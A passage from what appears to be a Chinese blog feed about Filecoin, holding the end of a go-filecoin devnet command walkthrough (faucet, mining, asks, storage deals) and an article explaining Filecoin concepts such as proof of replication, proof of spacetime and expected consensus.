peers/ip4/115.238.154.84/tcp/19109/ipfs/Qmb6ZYi7GLFAje3UekGZ2LZymck7RVHKSKb1bhPzzPTQkm/ip4/115.238.154.84/tcp/41187/ipfs/QmZ9UHdU2fwDN7emWW8AeaUdkF9fT7RwJrnbbdcQFUq9X6/ip4/123.134.67.81/tcp/6000/ipfs/QmccrEQsauwge4BZQeN1jBtFyd7dnTi4pSDvkikMWaFccw/ip4/123.134.67.82/tcp/6000/ipfs/QmWuA1AW4qDqztDrwo2pBgT2au67BJbGtEzWRufbc8isgn/ip4/123.134.67.83/tcp/6000/ipfs/QmbPCabGcngs3bCgMK8dC3w9pjoyPd1NFyDhbkgLyT2eJ7/ip4/123.134.67.85/tcp/6000/ipfs/QmUqSSZrwfSUU3vfw7D1UyKaLvEv1Ykcvx3ntvSXWaA7kj/ip4/123.134.67.86/tcp/6000/ipfs/QmPrz2z764AVaHivM7iX2JqRw5EdE3jcZTrjwVxS4VukyK/ip4/123.134.67.87/tcp/6000/ipfs/QmTxVFq3u7qPxsXFQdoyqPrdh6meW6JBGkSJ8HJXAiMUfh/ip4/123.134.67.88/tcp/6000/ipfs/QmXAVRPYu57XDwJHszn9U9x1KtTwPsJBaS1mTdNZzAQVyQ/ip4/123.134.67.89/tcp/6000/ipfs/Qmc5umx9R3bpD5VxvUmfyLoDz5wtVT43p5xjSEmTe26qTD go-filecoin ping peerID 确认连通性 1234567waynewyang:filecoin waynewyang$ go-filecoin ping QmW4Z8p7FCspLV1FeTRW6uCNApUXqkm8xYYw4yuBnqBGeBPING &lt;peer.ID Qm*nqBGeB&gt;Pong received: time=245.12 msPong received: time=245.61 msPong received: time=251.98 msPong received: time=245.69 msPong received: time=255.64 ms 给你的filecoin Node设置昵称 1234waynewyang:filecoin waynewyang$ go-filecoin config heartbeat.nickname &quot;wwwarsyuncom&quot;&quot;wwwarsyuncom&quot;waynewyang:filecoin waynewyang$ go-filecoin config heartbeat.nickname&quot;wwwarsyuncom&quot; 激活节点 1go-filecoin config heartbeat.beatTarget &quot;/dns4/stats-infra.kittyhawk.wtf/tcp/8080/ipfs/QmUWmZnpZb6xFryNDeNU7KcJ1Af5oHy7fB9npU67sseEjR&quot; 在 https://stats.kittyhawk.wtf/ 查看filecoin网络，节点已经激活 获取Mock FIL用于测试 FIL用于矿工抵押；或者作为客户进行交易需要 注意：开发网目前运行的都是全节点，获取mock FIL需要建立在本地区块数据同步完成的基础上进行，必须同步完区块之后才能生效，根据个人机器配置情况，这需要较长一段时间。 go-filecoin message wait ${MESSAGE_CID} 本质上是转账交易，wiki上说明的是等待30s，但是这是在本地区块数据同步完成的基础上才行的。 笔者已提交建议给官方，在wiki上更为清晰地表述。 1234567891011121314151617181920212223242526272829303132333435waynewyang:filecoin waynewyang$ go-filecoin wallet addrs lsfcq09qtmrxgq5sdr95gs93tx79u9uymdwfdsaphpawaynewyang:filecoin waynewyang$ export WALLET_ADDR=`go-filecoin wallet addrs ls`waynewyang:filecoin waynewyang$ MESSAGE_CID=`curl -X POST -F &quot;target=$&#123;WALLET_ADDR&#125;&quot; &quot;http://user.kittyhawk.wtf:9797/tap&quot; | cut -d&quot; &quot; -f4` % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 232 100 50 100 182 48 177 0:00:01 0:00:01 --:--:-- 177waynewyang:go-filecoin waynewyang$ go-filecoin message wait $&#123;MESSAGE_CID&#125;&#123; &quot;meteredMessage&quot;: &#123; &quot;message&quot;: &#123; &quot;to&quot;: &quot;fcqm0u932ja5thlsy4dgpz5urlapk8qhtd0clqv5e&quot;, &quot;from&quot;: &quot;fcq09sqhrd4gls86muuenzvqdc37mzscagapjveal&quot;, &quot;nonce&quot;: &quot;rQQ=&quot;, &quot;value&quot;: &quot;1000&quot;, &quot;method&quot;: &quot;&quot;, &quot;params&quot;: null &#125;, &quot;gasPrice&quot;: &quot;0&quot;, &quot;gasLimit&quot;: &quot;AA==&quot; &#125;, &quot;signature&quot;: &quot;WKA+eRY7XCQlSmallzoFu8Tps7NZ2AOAKLRFo21rTERFYJqXJT2qEWZ8sFvm6ZShR5syb7RSAJnDp4Am2Vzp0gE=&quot;&#125;&#123; &quot;exitCode&quot;: 0, &quot;return&quot;: null, &quot;gasAttoFIL&quot;: &quot;0&quot;&#125;waynewyang:filecoin waynewyang$ go-filecoin wallet balance fcq09qtmrxgq5sdr95gs93tx79u9uymdwfdsaphpa1000waynewyang:filecoin waynewyang$ go-filecoin wallet balance $&#123;WALLET_ADDR&#125;1000 矿工操作存储矿工 创建存储矿工示例，需要等待1分钟左右 抵押10个扇区的存储空间（当前默认每个扇区256MiB） 支付100个FIL为担保 gas价格为0 限制gas消耗最大为1000个FIL 12waynewyang:filecoin waynewyang$ go-filecoin miner create 10 100 --price=0 --limit=1000 --peerid `go-filecoin id | jq -r &apos;.ID&apos;`fcqjge872spqrgtm8dhlndjgfhhuxzx0y3ujvxxsl //所返回的就是矿工地址minerAddress 启动挖矿 12waynewyang:filecoin waynewyang$ go-filecoin mining startStarted mining 收益之一: 启动挖矿之后就可以参与挖区块奖励 查询区块头 12waynewyang:go-filecoin waynewyang$ go-filecoin chain head[&#123;&quot;/&quot;:&quot;zDPWYqFD2mBqLx7bwQNdeVoMxj6SC5HxzorZAoXpT6xjaythnENw&quot;&#125;] 查询具体区块信息 12345678go-filecoin show block &lt;blockID&gt;waynewyang:go-filecoin waynewyang$ go-filecoin show block zDPWYqFD2mBqLx7bwQNdeVoMxj6SC5HxzorZAoXpT6xjaythnENwBlock DetailsMiner: fcq0y72meekgwnvchwml0uzx759q25nk0rqc47retWeight: 293567.552Height: 10787Nonce: 0 收益之二：创建报价单ask 1234567891011121314151617181920212223242526272829303132331) 获取矿工地址export MINER_ADDR=`go-filecoin config mining.minerAddress | tr -d \&quot;` 2) 设置矿机Ownerexport MINER_OWNER_ADDR=`go-filecoin miner owner $MINER_ADDR`3) 创建报价单，价格0.000000001 FIL/byte/block, 交易费0，gas限制1000，提供2880个block空间存储go-filecoin miner set-price --from=$MINER_OWNER_ADDR --miner=$MINER_ADDR --price=0 --limit=1000 0.000000001 2880 # output: CID of the ask发布报价单，需要打包进去区块waynewyang:filecoin waynewyang$ go-filecoin miner set-price --from=$MINER_OWNER_ADDR --miner=$MINER_ADDR --price=0 --limit=1000 0.000000001 15315Set price for miner fcqjge872spqrgtm8dhlndjgfhhuxzx0y3ujvxxsl to 0.000000001. Published ask, cid: zDPWYqFCxL3VW3xzmHhCBqPTvhoQa53pn6DzV3uY23jNL76za1Vt. Ask confirmed on chain in block: zDPWYqFD7wjnj74sdB9HqupDmWmpPPEvygB14Pbo6rQC7ho2687D.4) 查询区块信息（第三步中是zDPWYqFD7wjnj74sdB9HqupDmWmpPPEvygB14Pbo6rQC7ho2687D）可以找到对应报价单信息waynewyang:filecoin waynewyang$ go-filecoin show block zDPWYqFD7wjnj74sdB9HqupDmWmpPPEvygB14Pbo6rQC7ho2687D --enc=json&#123;&quot;miner&quot;:&quot;fcqnam6n2qml2eyngws25srzvhcdf0t8gcgrsvnrk&quot;,&quot;ticket&quot;:&quot;AM0p5IC9ph+o9dTwd/MXYdeOJW25PfDwhTgonNRkSP4=&quot;,&quot;parents&quot;:[&#123;&quot;/&quot;:&quot;zDPWYqFCwNWHJXdeXcjx7ipUvRKFq5WhLbtSm6ESuNufkLuGiAgW&quot;&#125;],&quot;parentWeight&quot;:&quot;kujBrQE=&quot;,&quot;height&quot;:&quot;2Hc=&quot;,&quot;nonce&quot;:&quot;AA==&quot;,&quot;messages&quot;:[&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqp606qfk5gwmq6ac24g4mhv3cr8zzf67vqkpulh&quot;,&quot;from&quot;:&quot;fcqr89lj0lvduj475zw002j6q5yrl30ks7uep2p5e&quot;,&quot;nonce&quot;:&quot;Ag==&quot;,&quot;value&quot;:&quot;215.6046624&quot;,&quot;method&quot;:&quot;createChannel&quot;,&quot;params&quot;:&quot;glYAABXMs4C0hXqcW94YGyVKxii6SLQhQ6HoAg==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;rAI=&quot;&#125;,&quot;signature&quot;:&quot;vHzwO73TvM8MW1FKg8Qgfy/IP+wfJIQkEK0ExBB75gBbPMhv6GiU4aBq1T2Gb2OeMfrch8Zg3EFOJd0uUJltwAE=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqafmqgvzkzpvc6wjxecm7gsweuawjv8t6falk6r&quot;,&quot;from&quot;:&quot;fcqr89lj0lvduj475zw002j6q5yrl30ks7uep2p5e&quot;,&quot;nonce&quot;:&quot;Aw==&quot;,&quot;value&quot;:&quot;100&quot;,&quot;method&quot;:&quot;createMiner&quot;,&quot;params&quot;:&quot;g0EKWEEEiA8ArEoyzhjWwijpTWYqDsOFfwxa2F0pUfOyRI/6yY28OD4QHcwUdb3a9omX9DNxVzdS2a8pWgiLNowe9wYVcFgiEiD3rKfg/NyDnrLF9IGxfp6U72jZxuniXlPcv5SG5OZHrA==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;6Ac=&quot;&#125;,&quot;signature&quot;:&quot;/X/87zil8InOeLeQ6kqkqnpg7mP/e5jMaaVS4LRMIdYN84HTbABBpvt6quRqVQsadJnqOW7mn+6NA+2d9FDjPAA=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqp606qfk5gwmq6ac24g4mhv3cr8zzf67vqkpulh&quot;,&quot;from&quot;:&quot;fcqmqr5f2a5qnwnvftpuzd6sjfy5tcq5dd0k24h85&quot;,&quot;nonce&quot;:&quot;Ug==&quot;,&quot;value&quot;:&quot;0.008596&quot;,&quot;method&quot;:&quot;createChannel&quot;,&quot;params&quot;:&quot;glYAAIVV3axUhfe7OGwwSH/IIONRcbinQ/OWAQ==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;rAI=&quot;&#125;,&quot;signature&quot;:&quot;dxhSaVRvFBtdrbnEByza7a5JqLzm6n6rVZYGuFN6zegCTMDKbGGh++EvVmWo0WSbdcUo2vB/jFTgqzATh9+1NQA=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqugc6nql2eqglfwq0dw7ep7l9a07jacqgstely7&quot;,&quot;from&quot;:&quot;fcq0nmdcq7updgwc3uh2lz2rnjms7gprdggcvxjqj&quot;,&quot;nonce&quot;:&quot;BA==&quot;,&quot;value&quot;:null,&quot;method&quot;:&quot;commitSector&quot;,&quot;params&quot;:&quot;hUECWCCFzRGqHyJ3VWk3GueHzfkcWF218hOqRGtLxsJ0oJ3pXVgg6qrxCGo6SSjyUSbJWVKPKGaY/wrymC21t5LSScCNpQBYIOeZkdzp7lPt8Fh/Sdl9YqJ8BCaJ7etWEnDnLzRnV/geWQGAlTMp95t1Hh61eFBmzy6Ex/Ee1cso7Cethz+Z2EHCfhi5UzOMeLqeA/Wfypcnrw15mF4OrYR8648RXx6jp8svbgZ6Jg9fP/q0RukszZ/SD9f0pCMg2N/xt5hVIPG7jowSCfkj//CpdRj1GRPLzXvzyWmW4SgKR4lNpJNnmuiXSe8nYLsZgY2v8xy4NB448e/slxh7D4NQPanCoN3WO10oBR42ZxeCZY6stq+JfwucGr5OajgXSK2rGwz/Sj+GYpMbtgpfxSd4Z+jZ6mnoY03NaIHvwnDKchRz797lFL3so6AQRRnctN3Pl7LSn52YA0EOkmhJLMev6DKBWEqSfjXTY4AJSJ7RmGq88BXoHzwGjndRj0QHFtSTjHIoxF9uN86zB6gfSS+A7ZviuTvfturtKee243b9OIojIf2ne2hF8+7PSIwCp5FPLXEqR/UtXnJ6pxjBKhF36k3FRdzsxo52DMImgPhluGWI3xRhpIMmFNDMNynOBQ9F6mnR8fRBdPKB&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;rAI=&quot;&#125;,&quot;signature&quot;:&quot;hEluqbFG8TTSeeJyfOs10fZD/gOsrnFV8QgRAb4mhSFlzYpcijT9ye1yUYam5hcsW1eq1MFRfVGHhqYYUZ4LYwA=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqjge872spqrgtm8dhlndjgfhhuxzx0y3ujvxxsl&quot;,&quot;from&quot;:&quot;fcqm0u932ja5thlsy4dgpz5urlapk8qhtd0clqv5e&quot;,&quot;nonce&quot;:&quot;AQ==&quot;,&quot;value&quot;:&quot;0&quot;,&quot;method&quot;:&quot;addAsk&quot;,&quot;params&quot;:&quot;gkWAlOvcA0I70w==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;6Ac=&quot;&#125;,&quot;signature&quot;:&quot;IGUvf7CZ8lKDSTyzbg5kyArIPv8TIoFEWpA3ihRC7I86NFvgebCdEKQ6PqYhTJj1GQK/+JF28kCinXFN/9G8FgE=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqp606qfk5gwmq6ac24g4mhv3cr8zzf67vqkpulh&quot;,&quot;from&quot;:&quot;fcqsvmdzpy5mjc9m0cuh6uhmprr6gk5w2zcrnjy02&quot;,&quot;nonce&quot;:&quot;Aw==&quot;,&quot;value&quot;:&quot;0.0000301989888&quot;,&quot;method&quot;:&quot;createChannel&quot;,&quot;params&quot;:&quot;glYAAGsLRe4dsJwsvfE2+dkEh1DPX11jQ+OdAQ==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;rAI=&quot;&#125;,&quot;signature&quot;:&quot;Zg5kUOtEZ9Um+mGKicHaqTCaORppGv5KAaSlTpN/qTcoTptRUP3ZbQ5YOL7zjTG6aF7Y4r0Ck0NsnG0J/i2B0AA=&quot;&#125;,&#123;&quot;meteredMessage&quot;:&#123;&quot;message&quot;:&#123;&quot;to&quot;:&quot;fcqp606qfk5gwmq6ac24g4mhv3cr8zzf67vqkpulh&quot;,&quot;from&quot;:&quot;fcqrqtfcug5hlx7gugvwj0f2dyx6j9cxdn0ynmpu3&quot;,&quot;nonce&quot;:&quot;Ag==&quot;,&quot;value&quot;:&quot;0&quot;,&quot;method&quot;:&quot;createChannel&quot;,&quot;params&quot;:&quot;glYAAJsQ6e5i/M0X04YZwzl3VWckPu4RQ62HAQ==&quot;&#125;,&quot;gasPrice&quot;:&quot;0&quot;,&quot;gasLimit&quot;:&quot;rAI=&quot;&#125;,&quot;signature&quot;:&quot;oisXV83sTFkJw7y5KbO5fLhx2oa48qZKAVwX+1fIvWUDgm5PQNDddPeCkklPg2L+fmp4wL2fLF9R2qPRciLUfAA=&quot;&#125;],&quot;stateRoot&quot;:&#123;&quot;/&quot;:&quot;zdpuAvwpuqNR4J6PJDqGfF5GbyjWarD1BhujTUfyREMHSY1eF&quot;&#125;,&quot;messageReceipts&quot;:[&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;Ag==&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;AAA2Qrupiubk6ljOMnMUrnnHKaVXmQ==&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;0gA=&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:null,&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;Aw==&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;,&#123;&quot;exitCode&quot;:0,&quot;return&quot;:[&quot;Ag==&quot;],&quot;gasAttoFIL&quot;:&quot;0&quot;&#125;],&quot;proof&quot;:[177,165,90,219,1,18,240,190,113,56,243,22,167,201,232,75,124,152,130,111,74,132,5,192,33,191,102,220,102,9,99,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]&#125;//查询最新区块信息waynewyang:go-filecoin waynewyang$ go-filecoin show block `go-filecoin chain head --repodir=~/.filecoin2/ |jq -r &apos;.[0]&apos;|jq -r &apos;.[&quot;/&quot;]&apos;`Block DetailsMiner: fcq973y2y7hvcce8zkwds7r2847xmfjvdecn98lwsWeight: 134386.836Height: 5013Nonce: 05) 获取所有矿工的报价信息go-filecoin client list-asks --enc=json | jq 现在默认是只要客户出价高于矿工报价，默认接受交易。 停止挖矿 12go-filecoin mining stoprm -rf ~/.filecoin //删除filecoin矿工实例，区块同步也被删除，再次实例化，需要再次同步区块 检索矿工 暂未发现支持，目前可以自己的供应商（具体矿工）处获取；后面通过更深入的分析之后另行补充。 修复矿工 修复矿工的概念是白皮书之后提出的，后面继续深入分析之后再另行补充。 客户操作存储客户 filecoin 与IPFS数据结构是兼容的 1234567891011121314151617181920//创建测试文件waynewyang:test waynewyang$ echo &quot;Hi my name is $USER&quot;&gt; hello.txtwaynewyang:test waynewyang$ cat hello.txt Hi my name is waynewyang//导入filecoin本地资源库waynewyang:test waynewyang$ export CID=`go-filecoin client import ./hello.txt`waynewyang:test waynewyang$ echo $CIDQmchgh3N3kxWiaZ2cp9PbV93i77H3K8KtQCBTeVR5Q7wzs//这里会发现用IPFS上传得到的CID也是一样waynewyang:test waynewyang$ ipfs add hello.txt added Qmchgh3N3kxWiaZ2cp9PbV93i77H3K8KtQCBTeVR5Q7wzs hello.txt 25 B / 25 B [========================================================================] 100.00%//用go-filecoin或者IPFS命令获取数据，结果一致waynewyang:test waynewyang$ go-filecoin client cat $CIDHi my name is waynewyangwaynewyang:test waynewyang$ ipfs block get $CIDHi my name is waynewyang 导入测试数据 1234waynewyang:sample-data waynewyang$ export CID=`go-filecoin client import camel.jpg`waynewyang:sample-data waynewyang$ go-filecoin client cat $CID &gt; image.png &amp;&amp; open image.pngwaynewyang:sample-data waynewyang$ echo $CIDQmeubcGKFXpafFT4xRFGf3NqDRzJUVoAqe5sh1ugbRPZ7u 查询矿工的报价单 123456789101112131415161718192021222324252627282930waynewyang:sample-data waynewyang$ go-filecoin client list-asks --enc=json | jq&#123; &quot;Miner&quot;: &quot;fcqvnwlanfu7ecflnp3rc5gm0ecdamvxgvlawref4&quot;, &quot;Price&quot;: &quot;0.000000001&quot;, &quot;Expiry&quot;: 7079, &quot;ID&quot;: 0, &quot;Error&quot;: null&#125;&#123; &quot;Miner&quot;: &quot;fcqsmut6jnwchq0qlc3t6v44pzgf8l49lg6r8wl4a&quot;, &quot;Price&quot;: &quot;0.000000001&quot;, &quot;Expiry&quot;: 16522, &quot;ID&quot;: 0, &quot;Error&quot;: null&#125;&#123; &quot;Miner&quot;: &quot;fcqsmut6jnwchq0qlc3t6v44pzgf8l49lg6r8wl4a&quot;, &quot;Price&quot;: &quot;0.000000000000000001&quot;, &quot;Expiry&quot;: 18753, &quot;ID&quot;: 1, &quot;Error&quot;: null&#125;&#123; &quot;Miner&quot;: &quot;fcqghrce7vaf6czj54x5qke0mn2uzzg8ckvgvcjpe&quot;, &quot;Price&quot;: &quot;0.000000001&quot;, &quot;Expiry&quot;: 14404, &quot;ID&quot;: 0, &quot;Error&quot;: null&#125;...... 下单 123456go-filecoin client propose-storage-deal &lt;miner&gt; &lt;data&gt; &lt;ask&gt; &lt;duration&gt;&lt;miner&gt; address of the miner from list-asks&lt;data&gt; CID of the imported data that you want to store&lt;ask&gt; ID of the ask, also from list-asks (usually 0)&lt;duration&gt; how long you want to store (in # of ~30sec blocks). For example, storing for 1 day (2 blocks/min * 60 min/hr * 24 hr/day) = 2880 blocks. 发送数据和支付 1234567891 支付1）支付到paych中2）定期向矿工付款2 数据1）未密封完的数据称之为暂存区2）密封完成后阶段性支付 检索客户 现在是指定所对应的存储矿工进行检索，暂未发现更多支持，在后面的深入分析中会继续跟进。 查询订单状态，必须是密封，posted交易结束后才能查询 1go-filecoin client query-storage-deal &lt; dealID &gt; 检索 1go-filecoin retrieval-client retrieve-piece &lt; minerAddress &gt; &lt; CID &gt; filecoin合约文件合约 其实现在的创建存储矿工，以及矿工创建报价、存储客户提交订单存储，这些笔者认为属于filecoin文件合约的范畴。 与以太坊类似，以太坊抽象出了代币合约以及通用智能合约； 而filecoin则是抽象出了文件合约和通用智能合约。 智能合约 暂未发现支持，在后面的深入分析中会继续跟进。 单机运行多个filecoin节点修改资源目录和服务端口的方式 go-filecoin init的时候，通过 ‘–repodir=所指定资源目录路径’ 命令进行初始化目录资源，后面的其他命令同样需要所指定资源目录路径进行操作。 修改资源目录下的config.json文件，将默认的端口予以修改，避免与另外的本机实例相冲突。 容器部署方式 可以打包成docker镜像，有兴趣的朋友可以自行尝试。 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析二：filecoin通用语言理解]]></title>
    <url>%2F2019%2F02%2F20%2Ffilecoin-code-analysis-2%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第二章filecoin通用语言理解。 为什么要把filecoin通用语言单独列为一讲笔者认为一位优秀的软件从业人员，必须具备两种必备能力 - 架构设计能力 - 架构剖析能力 这两者是相辅相成的，架构设计师所设计之架构不可能超过自己的认知范畴，故架构设计师必须有效高效地拓展自己的技术认知视图，以适应当代软件架构高速发展的现实。而拓展的途径，一方面就是相关理论体系的快速学习跟进；另一方面，就是实战，对有显著价值的优秀软件项目进行架构剖析。有理论、有实战方是王道。理解具体架构的通用语言就是分析他人架构设计思维的一条捷径。 理解具体技术架构的通用语言是分析架构的一条捷径 通用语言是架构设计人员为实现某个具体技术架构，所高度抽象出来的名词或者称谓，通过理解通用语言，可以快速理解架构设计人员的思维和设计目的。 与读书方法类似（薄读-&gt;厚读&gt;再薄读），理解通用语言就是第一次的薄读过程，非常重要。 对业务的理解是非常有必要的，所以在第一章中，笔者铺垫了filecoin的一些基本概念，任何架构的设计不能脱离业务而行，业务驱动开发仍是非常实用的架构模式；filecoin 技术架构从业务来划分，可划分为两个大的范畴。 分布式存储解决方案 存储矿工 检索矿工 存储客户端 检索客户端 区块链项目 filecoin公链 filecoin actors 智能合约 filecoin核心通用业务组件 组件名称 目的 DSN 保障数据安全、包括故障容错、数据完整性、数据可恢复等 新型存储证明 证明矿工按照协议规范存储了客户指定的数据，数据有效性 可验证市场 对矿工与客户组成的交易市场进行了建模，保证交易的有效性 有效工作量证明 出块的共识机制，很重要，做到激励兼容 下面各节将会对filecoin技术架构中的核心通用语言进行解释。 存储证明Proof-of-Storage包含复制证明(PoR)和时空证明(PoSt)，其作用主要有两点： 证明矿工做了有效存储 竞争区块打包出块，获取区块奖励 2.2.1 为什么使用存储证明 相对于PoW(Proof-of-Work)或者PoC PoW耗能严重；PoC以空间换时间，同样存在耗能严重问题 而filecoin网络的耗能必须远低于类似比特币的PoW，参见第一讲filecoin的对标对象，filecoin必须实现以更低的成对去应对商业竞争，同时提供相同级别的安全性，以及文件存储的效用 存储证明需要做要与实体经济挂钩，减少无谓浪费 相对于PoS(Proof-of-Stake)或者PoC Proof-of-Storage在定向领域（分布式存储）以更简单方式，协调激励，并驱使矿工以有竞争力的价格提供真实的新存储，它促使矿工积极保证filecoin网络的效用 当然Proof-of-Stake是区块链领域的热点研究问题 Proof-of-Storage阻止网络攻击 攻击类型 说明 阻止攻击原理 女巫攻击Sybil attack 作恶节点创造多个女巫身份，谎称存储了多个副本 每个节点的副本都是有签名的，想通过复制证明，就相当于真实做了有效存储 外包攻击outsourcing attacks 作恶节点快速从其他节点获取内容，谎称他们存储了比他们实际存储更多的内容 针对外包攻击，从其他节点获取的整个过程，满足不了证明人随机挑战的要求，依然需要重新生成副本（重新seal需要时间），从而阻止外包攻击 生成攻击generation attacks 作恶节点宣称将要存储超过其实际容量的内容但并未存储内容，以此增加出块的概率 宣称无用，存储证明一定要确认密封动作并能应对随机挑战才能OK，如果重新密封就来不及证明，每次挑战是有时间要求的 复制证明基础 复制证明本质上可以理解为一种零知识证明，既然是零知识证明，我们在后面需要理解filecoin复制证明的题目和答案 zk-SNARK zero knowledge Succinct Non-interactive ARgument of Knowledgezero knowledge：零知识，即在证明的过程中不透露任何内情succinct：简洁的，主要是指验证过程不涉及大量数据传输以及验证算法简单non-interactive：无交互。 生成证明的方法在filecoin架构中称之为seal密封 密封过程是需要时间的，Seal过程串行加密的过程，无法并行操作，seal密封过程是有意设计慢的，主要目的是为了防攻击。 filecoin复制证明的题目和答案 公开的信息 矿工的节点公钥、密封公钥、存储公钥、原始Data哈希、该矿工存储的副本根哈希 隐含因素理解： 特有节点的副本哈希是由哪些哈希组成（DAG），任意挑战者或者攻击者是不知情的 挑战随机参数，通过CRH(防碰撞的哈希散列Collision-resistant hashing)生成哈希之后传递给证明者，作用是确定特定的叶子节点的哈希，比如让证明者自行计算离H(c))最近的叶子节点哈希。 复制证明的题目与答案 挑战参数：副本哈希rt，挑战随机参数c -&gt; H(c) 证明者输入（题目）： H(c)（每一次挑战都会变） 隐含信息比喻：该叶子节点是与H(c)最近的节点 证明者输出（答案）： H(c)对应的叶子节点 ——&gt; rt的路径（攻击者是很难反推的） 时空证明 时空证明可以理解为矿工持续性地生成复制证明 挑战者输入一个随机参数c，后面的随机参数由证明者基于上一个的挑战答案去生成。(不用与挑战者持续交互) 下图中变量i会轮询生成新的时间变量产生随机挑战。 预期共识基础前提 filecoin基于存储证明(有效存储量)来作为矿工在整个网络中的power power属性 说明 公开 1 某一时刻，整个网络存储总量是公开的2 单个矿工某一时刻，有效存储总量是公开的 可公开验证的 对于每个存储任务，矿工都需要生成”时空证明“，证明持续提供服务。通过读取区块链，任何人都可以验证矿工的power声明是否是正确的。 变化 在任意时间点，矿工都可以通过增加新增扇区和扇区补充的抵押来增加新的存储。这样矿工就能变更他们能提供的power。 使用power达成共识 目的： 每一轮选举一个（或多个）矿工，使得赢得选举的概率与每个矿工分配的存储成比例 filecoin预期共识(Expected Consensus,EC) 预期共识的基本直觉是确定性的，不可预测的 预期的期望是每个周期内当选的Leader是1，但一些周期内可能有0个或者许多的Leader。 在每个周期，每个区块链被延伸一个或多个区块，见下图 区块线性扩展，但是数据结构是DAG EC是一个概率共识，每个周期都使得比前面的区块更加确定，最终达到了足够的确定性 选举方案 预期共识通过选举方案产生 选举方案属性 说明 公平 每个参与者每次选举只有一次试验，因为签名是确定性的，而且t和rand(t)是固定的。随机值rand(t)在时刻t之前是未知的 保密 由于有能力的攻击者不拥有Mi用来计算签名的秘钥 公开可验证 当选Leader i ∈ Lt 可以通过给出t，rand(t)，H(i)/2L，来说服一个有效的验证者。鉴于前面的观点（复制证明与时间证明），有能力的攻击者在不拥有获胜秘密秘钥的情况下不能生成证明。 filecoin智能合约文件合约 允许用户对他们提供的存储服务进行条件编程，会形成一个多样化市场。 承包矿工：客户可以提前指定矿工提供服务而不参与市场 付款策略：客户可以为矿工设计不同的奖励策略，例如合约可以给矿工支付随着时间的推移越来高的费用 票务服务：合约可以允许矿工存放token和用于代表用户的存储/检索的支付 更复杂的操作：客户可以创建合约来运行数据更新 智能合约 用户可以将程序关联到其他系统（如以太坊)的交易上，他们不直接依赖存储的使用。 与其他系统的兼容 规格支持跨链交互，以便能将filecoin存储带入其他基于区块链的平台，同时也将其他平台的功能带入filecoin。 交易市场 存储需求和供给组成了两个Filecoin市场：存储市场和检索市场。这两个市场是两个去中心化交易所，简而言之，客户和矿工们通过向各自的市场提交订单来设定他们请求服务或者提供服务的订单的价格。交易所为客户和矿工们提供了一种方式来查看匹配出价并执行订单。如果服务请求被成功满足，通过运行管理协议，网络保证了矿工得到报酬，客户将被收取费用。 可以类比为淘宝商城 存储市场 交易数据会上链，包含于区块之中。 本质上也属于filecoin智能合约中的文件合约。 20190214上线的开发网络已支持 检索市场 交易数据不会上链，属于offchain的方式。 本质上也属于filecoin智能合约中的文件合约。 filecoin节点 filecoin节点相关 node id表示filecoin网络节点 account id并表示账号，默认与钱包地址一致 wallet addr表示钱包地址 miner id表示矿工id 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析一：filecoin概念]]></title>
    <url>%2F2019%2F02%2F18%2Ffilecoin-code-analysis-1%2F</url>
